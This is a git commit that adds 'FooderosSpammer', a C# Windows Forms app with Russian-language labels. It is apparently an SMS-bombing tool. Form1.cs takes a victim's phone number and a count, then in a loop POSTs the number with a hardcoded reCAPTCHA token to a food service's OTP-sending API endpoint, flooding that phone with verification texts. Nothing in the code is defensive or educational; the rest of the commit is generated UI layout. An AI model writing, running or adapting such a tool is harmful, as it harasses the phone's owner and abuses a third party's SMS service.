79b0044947fb1242452022a97e75cdd0045e5db4
Beybut Abdulragimov <31037730+BeyCoder@users.noreply.github.com>
2022-04-05 21:34:15 +0400

    Initial commit

---
+++ FooderosSpammer/Form1.Designer.cs
@@ -0,0 +1,255 @@
+﻿
+namespace FooderosSpammer
+{
+    partial class Form1
+    {
+        /// <summary>
+        ///  Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        ///  Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        ///  Required method for Designer support - do not modify
+        ///  the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.Options = new System.Windows.Forms.GroupBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.button1 = new System.Windows.Forms.Button();
+            this.button2 = new System.Windows.Forms.Button();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.Логи = new System.Windows.Forms.GroupBox();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.label4 = new System.Windows.Forms.Label();
+            this.label5 = new System.Windows.Forms.Label();
+            this.label6 = new System.Windows.Forms.Label();
+            this.label7 = new System.Windows.Forms.Label();
+            this.label8 = new System.Windows.Forms.Label();
+            this.Options.SuspendLayout();
+            this.Логи.SuspendLayout();
+            this.groupBox1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(60, 22);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(231, 23);
+            this.textBox1.TabIndex = 0;
+            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // Options
+            // 
+            this.Options.Controls.Add(this.label2);
+            this.Options.Controls.Add(this.textBox2);
+            this.Options.Controls.Add(this.label1);
+            this.Options.Controls.Add(this.textBox1);
+            this.Options.Location = new System.Drawing.Point(12, 12);
+            this.Options.Name = "Options";
+            this.Options.Size = new System.Drawing.Size(297, 85);
+            this.Options.TabIndex = 1;
+            this.Options.TabStop = false;
+            this.Options.Text = "Настройки";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(6, 54);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(75, 15);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Количество:";
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(214, 51);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(77, 23);
+            this.textBox2.TabIndex = 2;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(6, 25);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(48, 15);
+            this.label1.TabIndex = 1;
+            this.label1.Text = "Номер:";
+            // 
+            // button1
+            // 
+            this.button1.Font = new System.Drawing.Font("Segoe UI", 19F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.button1.Location = new System.Drawing.Point(12, 103);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(297, 53);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "Начать";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // button2
+            // 
+            this.button2.Font = new System.Drawing.Font("Segoe UI", 19F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.button2.Location = new System.Drawing.Point(12, 162);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(297, 53);
+            this.button2.TabIndex = 3;
+            this.button2.Text = "Остановить";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(6, 22);
+            this.textBox3.Multiline = true;
+            this.textBox3.Name = "textBox3";
+            this.textBox3.ReadOnly = true;
+            this.textBox3.Size = new System.Drawing.Size(624, 266);
+            this.textBox3.TabIndex = 4;
+            // 
+            // Логи
+            // 
+            this.Логи.Controls.Add(this.textBox3);
+            this.Логи.Location = new System.Drawing.Point(12, 221);
+            this.Логи.Name = "Логи";
+            this.Логи.Size = new System.Drawing.Size(636, 294);
+            this.Логи.TabIndex = 5;
+            this.Логи.TabStop = false;
+            this.Логи.Text = "Логи";
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.label7);
+            this.groupBox1.Controls.Add(this.label8);
+            this.groupBox1.Controls.Add(this.label5);
+            this.groupBox1.Controls.Add(this.label6);
+            this.groupBox1.Controls.Add(this.label4);
+            this.groupBox1.Controls.Add(this.label3);
+            this.groupBox1.Location = new System.Drawing.Point(315, 12);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(333, 203);
+            this.groupBox1.TabIndex = 4;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Настройки";
+            this.groupBox1.Enter += new System.EventHandler(this.groupBox1_Enter);
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(6, 30);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(75, 15);
+            this.label3.TabIndex = 3;
+            this.label3.Text = "Количество:";
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Segoe UI", 23F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label4.Location = new System.Drawing.Point(118, 19);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(35, 42);
+            this.label4.TabIndex = 4;
+            this.label4.Text = "0";
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Segoe UI", 23F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label5.Location = new System.Drawing.Point(118, 80);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(35, 42);
+            this.label5.TabIndex = 6;
+            this.label5.Text = "0";
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Location = new System.Drawing.Point(6, 91);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(74, 15);
+            this.label6.TabIndex = 5;
+            this.label6.Text = "Отправлено";
+            // 
+            // label7
+            // 
+            this.label7.AutoSize = true;
+            this.label7.Font = new System.Drawing.Font("Segoe UI", 23F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point);
+            this.label7.Location = new System.Drawing.Point(118, 139);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(35, 42);
+            this.label7.TabIndex = 8;
+            this.label7.Text = "0";
+            // 
+            // label8
+            // 
+            this.label8.AutoSize = true;
+            this.label8.Location = new System.Drawing.Point(6, 150);
+            this.label8.Name = "label8";
+            this.label8.Size = new System.Drawing.Size(73, 15);
+            this.label8.TabIndex = 7;
+            this.label8.Text = "С ошибкой:";
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 15F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(660, 527);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.Логи);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.Options);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Options.ResumeLayout(false);
+            this.Options.PerformLayout();
+            this.Логи.ResumeLayout(false);
+            this.Логи.PerformLayout();
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.GroupBox Options;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.GroupBox Логи;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label label7;
+        private System.Windows.Forms.Label label8;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.Label label4;
+    }
+}
+
---
+++ FooderosSpammer/Form1.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Net.Http;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace FooderosSpammer
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void groupBox1_Enter(object sender, EventArgs e)
+        {
+
+        }
+
+        private static readonly HttpClient client = new HttpClient();
+
+        private async Task startAsync(string number, int count)
+        {
+
+            var values = new Dictionary<string, string>
+            {
+                {"phone", number},
+                {"country_id", "1"},
+                {"recaptcha", "03AGdBq26YUdKW_pEr7m2Q90Jzy7FlFRj98xkTuZKpLf2e7xyLQeLI5eDwv8rlML-2Xee7Qq-zND6uuXWLQQbiJGYq7hI52TV1_OQjIl08zyk2pNSHLSErVnpbYV5Qc_C0V2Shp0eIG2XrovTG3IqNoOVxbi0zoR9mvCP82xlSjif1K0ZRJohQ4fWiqEV-hvi-s87IQB4PCAiQKQC9V4ZpF5TvObToHNg51mzgr6dcbzh_zod3dSo3UUWFLgiE1elQdL-ud6706Htv4TUNwAdSCaPcpxUmqFnCh8CfxM2T5Rj7JscdX2w5qkTIlMzMga0Fzd_3ZVta9IB0t9XL2bbCRAbQygiMI6eSsXQ8OlnGCxRXSVIThKV3UINEJHSxw2wRcAwYlIj2ATLrtLyrgBxsOywXdOf7qQXySSCrzYIQhwTTfHzHrG8bjg-XgwTyaWkypbH-wBYE28b8hU317CwMWJu9b58i0Tx45Q"}
+            };
+            var content = new FormUrlEncodedContent(values);
+
+            int sent = 0;
+
+            for (int i = 0; i < count; i++)
+            {
+                var response = await client.PostAsync("https://api.fooderos.com/api/v1/send/otp", content);
+                textBox3.Text += (i + 1) + ". " + number + " sent";
+                label5.Text = "" + ++sent;
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            string number = textBox1.Text;
+            int count = int.Parse(textBox2.Text);
+            label4.Text = "" + count;
+            Thread thread = new Thread(start: () => startAsync(number, count));
+            thread.Start();
+        }
+    }
+}
